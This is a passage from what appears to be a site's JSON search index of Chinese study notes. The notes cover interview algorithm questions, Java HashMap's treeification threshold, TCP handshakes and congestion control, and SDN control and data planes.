https://support.huawei.com/enterprise/zh/doc/EDOC1100023543?section=j015","title":"OverLay"},{"location":"Note/\u865a\u62df\u5316/#iptable","text":"","title":"IPtable"},{"location":"Note/Interview/19.07.04/","text":"\u7b97\u6cd5 \u5927\u6839\u5806\u7684\u5efa\u7acb\u4e0e\u5efa\u7acb\u8fc7\u7a0b \u5c0f\u6839\u5806\u7684\u5efa\u7acb\u4e0e\u5efa\u7acb\u8fc7\u7a0b \u4e24\u4e2a\u9e21\u86cb\u6254100\u697c \u5feb\u901f\u627e\u5230\u524dn\u4e2a\u6570 \u7ed9\u5b9a\u5e8f\u5217\u5168\u6392\u5217\uff0c\u4f46\u662f\u7ed9\u5b9a\u7684\u5e8f\u5217\u4e2d\u6709\u91cd\u590d\u7684\u5143\u7d20\uff0c\u8981\u6c42\u5168\u6392\u5217\u7ed3\u679c\u4e2d\u4e0d\u80fd\u6709\u91cd\u590d \u9c7c\u5858\u5858\u4e3b\uff0c\u4f60\u600e\u4e48\u8ba1\u7b97\u4f60\u7684\u9c7c\u5858\u6709\u591a\u5c11\u9c7c \u6392\u884c\u699c\u95ee\u9898\uff0c\u4f60\u6709\u767e\u4e07\u7528\u6237\uff08\u90fd\u5728\u4e00\u4e2a\u533a\uff09\uff0c\u7528\u6237\u4f1a\u4ea7\u751f\u79ef\u5206\uff0c\u4f60\u9700\u8981\u5bf9\u7528\u6237\u8fdb\u884c\u6392\u884c\uff0c\u8981\u6c42\u6392\u540d\u5b9e\u65f6\u66f4\u65b0\uff0c\u5e76\u4e14\u5168\u533a\u4eba\u90fd\u53ef\u4ee5\u770b\u5230\u524d100\u540d\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7528\u6237\u90fd\u80fd\u5b9e\u65f6\u67e5\u8be2\u81ea\u5df1\u7684\u6392\u540d\uff0c\u5e76\u4e14\u5185\u5b58\u5360\u7528\u4e0d\u8d85\u8fc710M \u5b9e\u65f6\u5e76\u53d1\u6392\u5e8f\uff1f \u77e9\u9635\u4e58\u6cd5\u538b\u7f29","title":"\u7b97\u6cd5"},{"location":"Note/Interview/19.07.04/#_1","text":"\u5927\u6839\u5806\u7684\u5efa\u7acb\u4e0e\u5efa\u7acb\u8fc7\u7a0b \u5c0f\u6839\u5806\u7684\u5efa\u7acb\u4e0e\u5efa\u7acb\u8fc7\u7a0b \u4e24\u4e2a\u9e21\u86cb\u6254100\u697c \u5feb\u901f\u627e\u5230\u524dn\u4e2a\u6570 \u7ed9\u5b9a\u5e8f\u5217\u5168\u6392\u5217\uff0c\u4f46\u662f\u7ed9\u5b9a\u7684\u5e8f\u5217\u4e2d\u6709\u91cd\u590d\u7684\u5143\u7d20\uff0c\u8981\u6c42\u5168\u6392\u5217\u7ed3\u679c\u4e2d\u4e0d\u80fd\u6709\u91cd\u590d \u9c7c\u5858\u5858\u4e3b\uff0c\u4f60\u600e\u4e48\u8ba1\u7b97\u4f60\u7684\u9c7c\u5858\u6709\u591a\u5c11\u9c7c \u6392\u884c\u699c\u95ee\u9898\uff0c\u4f60\u6709\u767e\u4e07\u7528\u6237\uff08\u90fd\u5728\u4e00\u4e2a\u533a\uff09\uff0c\u7528\u6237\u4f1a\u4ea7\u751f\u79ef\u5206\uff0c\u4f60\u9700\u8981\u5bf9\u7528\u6237\u8fdb\u884c\u6392\u884c\uff0c\u8981\u6c42\u6392\u540d\u5b9e\u65f6\u66f4\u65b0\uff0c\u5e76\u4e14\u5168\u533a\u4eba\u90fd\u53ef\u4ee5\u770b\u5230\u524d100\u540d\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7528\u6237\u90fd\u80fd\u5b9e\u65f6\u67e5\u8be2\u81ea\u5df1\u7684\u6392\u540d\uff0c\u5e76\u4e14\u5185\u5b58\u5360\u7528\u4e0d\u8d85\u8fc710M \u5b9e\u65f6\u5e76\u53d1\u6392\u5e8f\uff1f \u77e9\u9635\u4e58\u6cd5\u538b\u7f29","title":"\u7b97\u6cd5"},{"location":"Note/Interview/\u5e38\u89c1\u7b97\u6cd5/","text":"\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32 leetcode 003","title":"\u5e38\u89c1\u7b97\u6cd5"},{"location":"Note/Interview/\u5e38\u89c1\u7b97\u6cd5/#_1","text":"leetcode 003","title":"\u6700\u957f\u4e0d\u91cd\u590d\u5b50\u4e32"},{"location":"Note/Interview/\u6570\u636e\u7ed3\u6784\u7684\u5e94\u7528/","text":"Java Hashmap \u4f20\u7edf\u7684Java HashMap \u7684\u5b9e\u73b0\u662f \u6570\u7ec4+\u94fe\u8868 \uff0c\u5373\u4f7f\u54c8\u5e0c\u51fd\u6570\u53d6\u5f97\u518d\u597d\uff0c\u4e5f\u5f88\u96be\u8fbe\u5230\u5143\u7d20\u767e\u5206\u767e\u5747\u5300\u5206\u5e03 \u8b6c\u5982\uff0c\u5f53 HashMap \u4e2d\u6709\u5927\u91cf\u7684\u5143\u7d20\u90fd\u5b58\u653e\u5230\u540c\u4e00\u4e2a\u6876\u4e2d\u65f6\uff0c\u8fd9\u4e2a\u6876\u4e0b\u6709\u4e00\u6761\u957f\u957f\u7684\u94fe\u8868\uff0c\u8fd9\u4e2a\u65f6\u5019 HashMap \u5c31\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u5047\u5982\u5355\u94fe\u8868\u6709 n \u4e2a\u5143\u7d20\uff0c\u904d\u5386\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u662f O(n)\uff0c\u5b8c\u5168\u5931\u53bb\u4e86\u5b83\u7684\u4f18\u52bf\u3002 \u56e0\u6b64\uff0c\u5f15\u5165\u4e86 \u7ea2\u9ed1\u6811 \uff0c\u5728\u94fe\u8868\u957f\u5ea6\u5927\u4e8e8\u7684\u65f6\u5019\u5c31\u5bf9\u5e94\u94fe\u8868\u8f6c\u6362\u4e3a\u7ea2\u9ed1\u6811 \u5176\u5b9e\uff0c\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u51cf\u5c11\u67e5\u627e\u7684\u6b21\u6570\uff0c\u5f53\u94fe\u8868\u8fc7\u957f\u65f6\uff0c\u8f6c\u6362\u4e3a\u6811\u7684\u7ed3\u6784\u80fd\u6709\u6548\u51cf\u5c11\u67e5\u8be2\u7684\u6b21\u6570 \u8b6c\u5982\uff0c\u53ef\u4ee5\u5c06\u94fe\u8868\u8f6c\u6362\u4e3aAVL\u6570\uff08\u81ea\u5e73\u8861\u4e8c\u53c9\u67e5\u627e\u6811\uff09\uff0c\u4f46\u662fAVL\u6811\u7684\u67e5\u627e\u662f\u7a33\u5b9a\u7684\uff0c\u4f46\u662f\u63d2\u5165\u548c\u5220\u9664\u662f\u6bd4\u8f83\u8017\u65f6\u7684\uff0c\u56e0\u6b64\u624d\u5f15\u5165\u4e86\u7ea2\u9ed1\u6811 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f8\uff0c\u7ea2\u9ed1\u6811\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u662f log(n) \uff0c\u957f\u5ea6\u4e3a8\u7684\u65f6\u5019\uff0c\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3a3\uff0c\u5982\u679c\u7ee7\u7eed\u4f7f\u7528\u94fe\u8868\uff0c\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3a \\frac{1+2+3+4+5+6+7+8}{8}=4.5 \\frac{1+2+3+4+5+6+7+8}{8}=4.5 \uff0c\u8fd9\u624d\u6709\u8f6c\u6362\u4e3a\u6811\u7684\u5fc5\u8981\u3002\u94fe\u8868\u957f\u5ea6\u5982\u679c\u662f\u5c0f\u4e8e\u7b49\u4e8e6\uff0c\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u662f3.5\uff0c\u867d\u7136\u901f\u5ea6\u4e5f\u5f88\u5feb\u7684\uff0c\u4f46\u662f\u8f6c\u5316\u4e3a\u6811\u7ed3\u6784\u548c\u751f\u6210\u6811\u7684\u65f6\u95f4\u5e76\u4e0d\u4f1a\u592a\u77ed\u3002 \u8fd8\u6709\u9009\u62e96\u548c8\uff0c\u4e2d\u95f4\u6709\u4e2a\u5dee\u503c7\u53ef\u4ee5\u6709\u6548\u9632\u6b62\u94fe\u8868\u548c\u6811\u9891\u7e41\u8f6c\u6362\u3002\u5047\u8bbe\u4e00\u4e0b\uff0c\u5982\u679c\u8bbe\u8ba1\u6210\u94fe\u8868\u4e2a\u6570\u8d85\u8fc78\u5219\u94fe\u8868\u8f6c\u6362\u6210\u6811\u7ed3\u6784\uff0c\u94fe\u8868\u4e2a\u6570\u5c0f\u4e8e8\u5219\u6811\u7ed3\u6784\u8f6c\u6362\u6210\u94fe\u8868\uff0c\u5982\u679c\u4e00\u4e2aHashMap\u4e0d\u505c\u7684\u63d2\u5165\u3001\u5220\u9664\u5143\u7d20\uff0c\u94fe\u8868\u4e2a\u6570\u57288\u5de6\u53f3\u5f98\u5f8a\uff0c\u5c31\u4f1a\u9891\u7e41\u7684\u53d1\u751f\u6811\u8f6c\u94fe\u8868\u3001\u94fe\u8868\u8f6c\u6811\uff0c\u6548\u7387\u4f1a\u5f88\u4f4e\u3002","title":"\u6570\u636e\u7ed3\u6784\u7684\u5e94\u7528"},{"location":"Note/Interview/\u6570\u636e\u7ed3\u6784\u7684\u5e94\u7528/#java-hashmap","text":"\u4f20\u7edf\u7684Java HashMap \u7684\u5b9e\u73b0\u662f \u6570\u7ec4+\u94fe\u8868 \uff0c\u5373\u4f7f\u54c8\u5e0c\u51fd\u6570\u53d6\u5f97\u518d\u597d\uff0c\u4e5f\u5f88\u96be\u8fbe\u5230\u5143\u7d20\u767e\u5206\u767e\u5747\u5300\u5206\u5e03 \u8b6c\u5982\uff0c\u5f53 HashMap \u4e2d\u6709\u5927\u91cf\u7684\u5143\u7d20\u90fd\u5b58\u653e\u5230\u540c\u4e00\u4e2a\u6876\u4e2d\u65f6\uff0c\u8fd9\u4e2a\u6876\u4e0b\u6709\u4e00\u6761\u957f\u957f\u7684\u94fe\u8868\uff0c\u8fd9\u4e2a\u65f6\u5019 HashMap \u5c31\u76f8\u5f53\u4e8e\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u5047\u5982\u5355\u94fe\u8868\u6709 n \u4e2a\u5143\u7d20\uff0c\u904d\u5386\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u5c31\u662f O(n)\uff0c\u5b8c\u5168\u5931\u53bb\u4e86\u5b83\u7684\u4f18\u52bf\u3002 \u56e0\u6b64\uff0c\u5f15\u5165\u4e86 \u7ea2\u9ed1\u6811 \uff0c\u5728\u94fe\u8868\u957f\u5ea6\u5927\u4e8e8\u7684\u65f6\u5019\u5c31\u5bf9\u5e94\u94fe\u8868\u8f6c\u6362\u4e3a\u7ea2\u9ed1\u6811 \u5176\u5b9e\uff0c\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u51cf\u5c11\u67e5\u627e\u7684\u6b21\u6570\uff0c\u5f53\u94fe\u8868\u8fc7\u957f\u65f6\uff0c\u8f6c\u6362\u4e3a\u6811\u7684\u7ed3\u6784\u80fd\u6709\u6548\u51cf\u5c11\u67e5\u8be2\u7684\u6b21\u6570 \u8b6c\u5982\uff0c\u53ef\u4ee5\u5c06\u94fe\u8868\u8f6c\u6362\u4e3aAVL\u6570\uff08\u81ea\u5e73\u8861\u4e8c\u53c9\u67e5\u627e\u6811\uff09\uff0c\u4f46\u662fAVL\u6811\u7684\u67e5\u627e\u662f\u7a33\u5b9a\u7684\uff0c\u4f46\u662f\u63d2\u5165\u548c\u5220\u9664\u662f\u6bd4\u8f83\u8017\u65f6\u7684\uff0c\u56e0\u6b64\u624d\u5f15\u5165\u4e86\u7ea2\u9ed1\u6811 \u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f8\uff0c\u7ea2\u9ed1\u6811\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u662f log(n) \uff0c\u957f\u5ea6\u4e3a8\u7684\u65f6\u5019\uff0c\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3a3\uff0c\u5982\u679c\u7ee7\u7eed\u4f7f\u7528\u94fe\u8868\uff0c\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3a \\frac{1+2+3+4+5+6+7+8}{8}=4.5 \\frac{1+2+3+4+5+6+7+8}{8}=4.5 \uff0c\u8fd9\u624d\u6709\u8f6c\u6362\u4e3a\u6811\u7684\u5fc5\u8981\u3002\u94fe\u8868\u957f\u5ea6\u5982\u679c\u662f\u5c0f\u4e8e\u7b49\u4e8e6\uff0c\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u662f3.5\uff0c\u867d\u7136\u901f\u5ea6\u4e5f\u5f88\u5feb\u7684\uff0c\u4f46\u662f\u8f6c\u5316\u4e3a\u6811\u7ed3\u6784\u548c\u751f\u6210\u6811\u7684\u65f6\u95f4\u5e76\u4e0d\u4f1a\u592a\u77ed\u3002 \u8fd8\u6709\u9009\u62e96\u548c8\uff0c\u4e2d\u95f4\u6709\u4e2a\u5dee\u503c7\u53ef\u4ee5\u6709\u6548\u9632\u6b62\u94fe\u8868\u548c\u6811\u9891\u7e41\u8f6c\u6362\u3002\u5047\u8bbe\u4e00\u4e0b\uff0c\u5982\u679c\u8bbe\u8ba1\u6210\u94fe\u8868\u4e2a\u6570\u8d85\u8fc78\u5219\u94fe\u8868\u8f6c\u6362\u6210\u6811\u7ed3\u6784\uff0c\u94fe\u8868\u4e2a\u6570\u5c0f\u4e8e8\u5219\u6811\u7ed3\u6784\u8f6c\u6362\u6210\u94fe\u8868\uff0c\u5982\u679c\u4e00\u4e2aHashMap\u4e0d\u505c\u7684\u63d2\u5165\u3001\u5220\u9664\u5143\u7d20\uff0c\u94fe\u8868\u4e2a\u6570\u57288\u5de6\u53f3\u5f98\u5f8a\uff0c\u5c31\u4f1a\u9891\u7e41\u7684\u53d1\u751f\u6811\u8f6c\u94fe\u8868\u3001\u94fe\u8868\u8f6c\u6811\uff0c\u6548\u7387\u4f1a\u5f88\u4f4e\u3002","title":"Java Hashmap"},{"location":"Note/Interview/\u8ba1\u7b97\u673a\u7f51\u7edc/","text":"TCP \u4e09\u6b21\u63e1\u624b \u5ba2\u6237\u7aef\u53d1\u9001syn0\u7ed9\u670d\u52a1\u5668 \u670d\u52a1\u5668\u6536\u5230syn0\uff0c\u56de\u590dsyn1,ack(syn0+1) \u5ba2\u6237\u7aef\u6536\u5230syn1\uff0c\u56de\u590dack(syn1+1) \u56db\u6b21\u6325\u624b \u53ef\u9760\u6027 \u5e8f\u5217\u53f7\u3001\u786e\u8ba4\u5e94\u7b54\u3001\u8d85\u65f6\u91cd\u4f20 \u6570\u636e\u5230\u8fbe\u63a5\u6536\u65b9\uff0c\u63a5\u6536\u65b9\u9700\u8981\u53d1\u51fa\u4e00\u4e2a\u786e\u8ba4\u5e94\u7b54\uff0c\u8868\u793a\u5df2\u7ecf\u6536\u5230\u8be5\u6570\u636e\u6bb5\uff0c\u5e76\u4e14\u786e\u8ba4\u5e8f\u53f7\u4f1a\u8bf4\u660e\u4e86\u5b83\u4e0b\u4e00\u6b21\u9700\u8981\u63a5\u6536\u7684\u6570\u636e\u5e8f\u5217\u53f7\u3002\u5982\u679c\u53d1\u9001\u53d1\u8fdf\u8fdf\u672a\u6536\u5230\u786e\u8ba4\u5e94\u7b54\uff0c\u90a3\u4e48\u53ef\u80fd\u662f\u53d1\u9001\u7684\u6570\u636e\u4e22\u5931\uff0c\u4e5f\u53ef\u80fd\u662f\u786e\u8ba4\u5e94\u7b54\u4e22\u5931\uff0c\u8fd9\u65f6\u53d1\u9001\u65b9\u5728\u7b49\u5f85\u4e00\u5b9a\u65f6\u95f4\u540e\u4f1a\u8fdb\u884c\u91cd\u4f20\u3002\u8fd9\u4e2a\u65f6\u95f4\u4e00\u822c\u662f2*RTT(\u62a5\u6587\u6bb5\u5f80\u8fd4\u65f6\u95f4\uff09+\u4e00\u4e2a\u504f\u5dee\u503c\u3002 \u7a97\u53e3\u63a7\u5236\u4e0e\u9ad8\u901f\u91cd\u53d1\u63a7\u5236/\u5feb\u901f\u91cd\u4f20\uff08\u91cd\u590d\u786e\u8ba4\u5e94\u7b54\uff09 TCP\u4f1a\u5229\u7528\u7a97\u53e3\u63a7\u5236\u6765\u63d0\u9ad8\u4f20\u8f93\u901f\u5ea6\uff0c\u610f\u601d\u662f\u5728\u4e00\u4e2a\u7a97\u53e3\u5927\u5c0f\u5185\uff0c\u4e0d\u7528\u4e00\u5b9a\u8981\u7b49\u5230\u5e94\u7b54\u624d\u80fd\u53d1\u9001\u4e0b\u4e00\u6bb5\u6570\u636e\uff0c\u7a97\u53e3\u5927\u5c0f\u5c31\u662f\u65e0\u9700\u7b49\u5f85\u786e\u8ba4\u800c\u53ef\u4ee5\u7ee7\u7eed\u53d1\u9001\u6570\u636e\u7684\u6700\u5927\u503c\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u7a97\u53e3\u63a7\u5236\uff0c\u6bcf\u4e00\u4e2a\u6ca1\u6536\u5230\u786e\u8ba4\u5e94\u7b54\u7684\u6570\u636e\u90fd\u8981\u91cd\u53d1\u3002 \u62e5\u585e\u63a7\u5236 \u5982\u679c\u628a\u7a97\u53e3\u5b9a\u7684\u5f88\u5927\uff0c\u53d1\u9001\u7aef\u8fde\u7eed\u53d1\u9001\u5927\u91cf\u7684\u6570\u636e\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u7f51\u7edc\u7684\u62e5\u5835\uff08\u5927\u5bb6\u90fd\u5728\u7528\u7f51\uff0c\u4f60\u5728\u8fd9\u72c2\u53d1\uff0c\u541e\u5410\u91cf\u5c31\u90a3\u4e48\u5927\uff0c\u5f53\u7136\u4f1a\u5835\uff09\uff0c\u751a\u81f3\u9020\u6210\u7f51\u7edc\u7684\u762b\u75ea\u3002\u6240\u4ee5TCP\u5728\u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u800c\u8fdb\u884c\u4e86\u62e5\u585e\u63a7\u5236\u3002 \u6162\u542f\u52a8\uff1a\u5b9a\u4e49\u62e5\u585e\u7a97\u53e3\uff0c\u4e00\u5f00\u59cb\u5c06\u8be5\u7a97\u53e3\u5927\u5c0f\u8bbe\u4e3a1\uff0c\u4e4b\u540e\u6bcf\u6b21\u6536\u5230\u786e\u8ba4\u5e94\u7b54\uff08\u7ecf\u8fc7\u4e00\u4e2artt\uff09\uff0c\u5c06\u62e5\u585e\u7a97\u53e3\u5927\u5c0f*2\u3002 \u62e5\u585e\u907f\u514d\uff1a\u8bbe\u7f6e\u6162\u542f\u52a8\u9608\u503c\uff0c\u4e00\u822c\u5f00\u59cb\u90fd\u8bbe\u4e3a65536\u3002\u62e5\u585e\u907f\u514d\u662f\u6307\u5f53\u62e5\u585e\u7a97\u53e3\u5927\u5c0f\u8fbe\u5230\u8fd9\u4e2a\u9608\u503c\uff0c\u62e5\u585e\u7a97\u53e3\u7684\u503c\u4e0d\u518d\u6307\u6570\u4e0a\u5347\uff0c\u800c\u662f\u52a0\u6cd5\u589e\u52a0\uff08\u6bcf\u6b21\u786e\u8ba4\u5e94\u7b54/\u6bcf\u4e2artt\uff0c\u62e5\u585e\u7a97\u53e3\u5927\u5c0f+1\uff09\uff0c\u4ee5\u6b64\u6765\u907f\u514d\u62e5\u585e\u3002 \u5c06\u62a5\u6587\u6bb5\u7684\u8d85\u65f6\u91cd\u4f20\u770b\u505a\u62e5\u585e\uff0c\u5219\u4e00\u65e6\u53d1\u751f\u8d85\u65f6\u91cd\u4f20\uff0c\u6211\u4eec\u9700\u8981\u5148\u5c06\u9608\u503c\u8bbe\u4e3a\u5f53\u524d\u7a97\u53e3\u5927\u5c0f\u7684\u4e00\u534a\uff0c\u5e76\u4e14\u5c06\u7a97\u53e3\u5927\u5c0f\u8bbe\u4e3a\u521d\u503c1\uff0c\u7136\u540e\u91cd\u65b0\u8fdb\u5165\u6162\u542f\u52a8\u8fc7\u7a0b\u3002 \u5feb\u901f\u91cd\u4f20\uff1a\u5728\u9047\u52303\u6b21\u91cd\u590d\u786e\u8ba4\u5e94\u7b54\uff08\u9ad8\u901f\u91cd\u53d1\u63a7\u5236\uff09\u65f6\uff0c\u4ee3\u8868\u6536\u5230\u4e863\u4e2a\u62a5\u6587\u6bb5\uff0c\u4f46\u662f\u8fd9\u4e4b\u524d\u76841\u4e2a\u6bb5\u4e22\u5931\u4e86\uff0c\u4fbf\u5bf9\u5b83\u8fdb\u884c\u7acb\u5373\u91cd\u4f20\u3002","title":"\u8ba1\u7b97\u673a\u7f51\u7edc"},{"location":"Note/Interview/\u8ba1\u7b97\u673a\u7f51\u7edc/#tcp","text":"","title":"TCP"},{"location":"Note/Interview/\u8ba1\u7b97\u673a\u7f51\u7edc/#_1","text":"\u5ba2\u6237\u7aef\u53d1\u9001syn0\u7ed9\u670d\u52a1\u5668 \u670d\u52a1\u5668\u6536\u5230syn0\uff0c\u56de\u590dsyn1,ack(syn0+1) \u5ba2\u6237\u7aef\u6536\u5230syn1\uff0c\u56de\u590dack(syn1+1)","title":"\u4e09\u6b21\u63e1\u624b"},{"location":"Note/Interview/\u8ba1\u7b97\u673a\u7f51\u7edc/#_2","text":"","title":"\u56db\u6b21\u6325\u624b"},{"location":"Note/Interview/\u8ba1\u7b97\u673a\u7f51\u7edc/#_3","text":"\u5e8f\u5217\u53f7\u3001\u786e\u8ba4\u5e94\u7b54\u3001\u8d85\u65f6\u91cd\u4f20 \u6570\u636e\u5230\u8fbe\u63a5\u6536\u65b9\uff0c\u63a5\u6536\u65b9\u9700\u8981\u53d1\u51fa\u4e00\u4e2a\u786e\u8ba4\u5e94\u7b54\uff0c\u8868\u793a\u5df2\u7ecf\u6536\u5230\u8be5\u6570\u636e\u6bb5\uff0c\u5e76\u4e14\u786e\u8ba4\u5e8f\u53f7\u4f1a\u8bf4\u660e\u4e86\u5b83\u4e0b\u4e00\u6b21\u9700\u8981\u63a5\u6536\u7684\u6570\u636e\u5e8f\u5217\u53f7\u3002\u5982\u679c\u53d1\u9001\u53d1\u8fdf\u8fdf\u672a\u6536\u5230\u786e\u8ba4\u5e94\u7b54\uff0c\u90a3\u4e48\u53ef\u80fd\u662f\u53d1\u9001\u7684\u6570\u636e\u4e22\u5931\uff0c\u4e5f\u53ef\u80fd\u662f\u786e\u8ba4\u5e94\u7b54\u4e22\u5931\uff0c\u8fd9\u65f6\u53d1\u9001\u65b9\u5728\u7b49\u5f85\u4e00\u5b9a\u65f6\u95f4\u540e\u4f1a\u8fdb\u884c\u91cd\u4f20\u3002\u8fd9\u4e2a\u65f6\u95f4\u4e00\u822c\u662f2*RTT(\u62a5\u6587\u6bb5\u5f80\u8fd4\u65f6\u95f4\uff09+\u4e00\u4e2a\u504f\u5dee\u503c\u3002 \u7a97\u53e3\u63a7\u5236\u4e0e\u9ad8\u901f\u91cd\u53d1\u63a7\u5236/\u5feb\u901f\u91cd\u4f20\uff08\u91cd\u590d\u786e\u8ba4\u5e94\u7b54\uff09 TCP\u4f1a\u5229\u7528\u7a97\u53e3\u63a7\u5236\u6765\u63d0\u9ad8\u4f20\u8f93\u901f\u5ea6\uff0c\u610f\u601d\u662f\u5728\u4e00\u4e2a\u7a97\u53e3\u5927\u5c0f\u5185\uff0c\u4e0d\u7528\u4e00\u5b9a\u8981\u7b49\u5230\u5e94\u7b54\u624d\u80fd\u53d1\u9001\u4e0b\u4e00\u6bb5\u6570\u636e\uff0c\u7a97\u53e3\u5927\u5c0f\u5c31\u662f\u65e0\u9700\u7b49\u5f85\u786e\u8ba4\u800c\u53ef\u4ee5\u7ee7\u7eed\u53d1\u9001\u6570\u636e\u7684\u6700\u5927\u503c\u3002\u5982\u679c\u4e0d\u4f7f\u7528\u7a97\u53e3\u63a7\u5236\uff0c\u6bcf\u4e00\u4e2a\u6ca1\u6536\u5230\u786e\u8ba4\u5e94\u7b54\u7684\u6570\u636e\u90fd\u8981\u91cd\u53d1\u3002 \u62e5\u585e\u63a7\u5236 \u5982\u679c\u628a\u7a97\u53e3\u5b9a\u7684\u5f88\u5927\uff0c\u53d1\u9001\u7aef\u8fde\u7eed\u53d1\u9001\u5927\u91cf\u7684\u6570\u636e\uff0c\u53ef\u80fd\u4f1a\u9020\u6210\u7f51\u7edc\u7684\u62e5\u5835\uff08\u5927\u5bb6\u90fd\u5728\u7528\u7f51\uff0c\u4f60\u5728\u8fd9\u72c2\u53d1\uff0c\u541e\u5410\u91cf\u5c31\u90a3\u4e48\u5927\uff0c\u5f53\u7136\u4f1a\u5835\uff09\uff0c\u751a\u81f3\u9020\u6210\u7f51\u7edc\u7684\u762b\u75ea\u3002\u6240\u4ee5TCP\u5728\u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u60c5\u51b5\u800c\u8fdb\u884c\u4e86\u62e5\u585e\u63a7\u5236\u3002 \u6162\u542f\u52a8\uff1a\u5b9a\u4e49\u62e5\u585e\u7a97\u53e3\uff0c\u4e00\u5f00\u59cb\u5c06\u8be5\u7a97\u53e3\u5927\u5c0f\u8bbe\u4e3a1\uff0c\u4e4b\u540e\u6bcf\u6b21\u6536\u5230\u786e\u8ba4\u5e94\u7b54\uff08\u7ecf\u8fc7\u4e00\u4e2artt\uff09\uff0c\u5c06\u62e5\u585e\u7a97\u53e3\u5927\u5c0f*2\u3002 \u62e5\u585e\u907f\u514d\uff1a\u8bbe\u7f6e\u6162\u542f\u52a8\u9608\u503c\uff0c\u4e00\u822c\u5f00\u59cb\u90fd\u8bbe\u4e3a65536\u3002\u62e5\u585e\u907f\u514d\u662f\u6307\u5f53\u62e5\u585e\u7a97\u53e3\u5927\u5c0f\u8fbe\u5230\u8fd9\u4e2a\u9608\u503c\uff0c\u62e5\u585e\u7a97\u53e3\u7684\u503c\u4e0d\u518d\u6307\u6570\u4e0a\u5347\uff0c\u800c\u662f\u52a0\u6cd5\u589e\u52a0\uff08\u6bcf\u6b21\u786e\u8ba4\u5e94\u7b54/\u6bcf\u4e2artt\uff0c\u62e5\u585e\u7a97\u53e3\u5927\u5c0f+1\uff09\uff0c\u4ee5\u6b64\u6765\u907f\u514d\u62e5\u585e\u3002 \u5c06\u62a5\u6587\u6bb5\u7684\u8d85\u65f6\u91cd\u4f20\u770b\u505a\u62e5\u585e\uff0c\u5219\u4e00\u65e6\u53d1\u751f\u8d85\u65f6\u91cd\u4f20\uff0c\u6211\u4eec\u9700\u8981\u5148\u5c06\u9608\u503c\u8bbe\u4e3a\u5f53\u524d\u7a97\u53e3\u5927\u5c0f\u7684\u4e00\u534a\uff0c\u5e76\u4e14\u5c06\u7a97\u53e3\u5927\u5c0f\u8bbe\u4e3a\u521d\u503c1\uff0c\u7136\u540e\u91cd\u65b0\u8fdb\u5165\u6162\u542f\u52a8\u8fc7\u7a0b\u3002 \u5feb\u901f\u91cd\u4f20\uff1a\u5728\u9047\u52303\u6b21\u91cd\u590d\u786e\u8ba4\u5e94\u7b54\uff08\u9ad8\u901f\u91cd\u53d1\u63a7\u5236\uff09\u65f6\uff0c\u4ee3\u8868\u6536\u5230\u4e863\u4e2a\u62a5\u6587\u6bb5\uff0c\u4f46\u662f\u8fd9\u4e4b\u524d\u76841\u4e2a\u6bb5\u4e22\u5931\u4e86\uff0c\u4fbf\u5bf9\u5b83\u8fdb\u884c\u7acb\u5373\u91cd\u4f20\u3002","title":"\u53ef\u9760\u6027"},{"location":"Note/SDN/SDN/","text":"\u57fa\u7840\u77e5\u8bc6 SDN\u539f\u5219\u5305\u542b\u4e86 \u5c06\u7f51\u7edc\u8bbe\u5907\u7684\u63a7\u5236\u4e0e\u6570\u636e\u5e73\u9762\u7684\u5206\u79bb \uff0c\u8be5\u64cd\u4f5c\u80fd\u5e26\u6765\u6f5c\u5728\u7684\u4f18\u52bf \u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u5206\u79bb\u4e4b\u540e\u5e94\u8be5\u591a\u8fdc\uff1f\u591a\u5c11\u5b9e\u529b\u624d\u80fd\u6ee1\u8db3\u6545\u969c\u7684\u6062\u590d\u80fd\u529b\u4e0e\u9ad8\u53ef\u7528\u6027\u7684\u9700\u6c42\uff1f \u63a7\u5236\u5e73\u9762\u4e0e\u6570\u636e\u5e73\u9762 \u63a7\u5236\u5e73\u9762 \u63a7\u5236\u5e73\u9762\u5728\u672c\u5730\u5efa\u7acb\u7528\u4e8e\u521b\u5efa\u8f6c\u53d1\u8868\u9879\u7684\u6570\u636e\u96c6\uff0c\u6570\u636e\u5e73\u9762\u5229\u7528\u8f6c\u53d1\u8868\u9879\u5728\u8bbe\u5907\u7684\u51fa\u5165\u7aef\u53e3\u4e4b\u95f4\u8f6c\u53d1\u6d41\u91cf \u4fdd\u5b58\u4e86\u7f51\u7edc\u62ec\u6251\u7684\u6570\u636e\u96c6\u6210\u4e3a\u8def\u7531\u4fe1\u606f\u5e93RIB \u4fdd\u5b58\u4e86\u8f6c\u53d1\u8868\u9879\u5219\u79f0\u4e3a\u8f6c\u53d1\u4fe1\u606f\u5e93FIB \u6570\u636e\u5e73\u9762","title":"SDN"},{"location":"Note/SDN/SDN/#_1","text":"SDN\u539f\u5219\u5305\u542b\u4e86 \u5c06\u7f51\u7edc\u8bbe\u5907\u7684\u63a7\u5236\u4e0e\u6570\u636e\u5e73\u9762\u7684\u5206\u79bb \uff0c\u8be5\u64cd\u4f5c\u80fd\u5e26\u6765\u6f5c\u5728\u7684\u4f18\u52bf 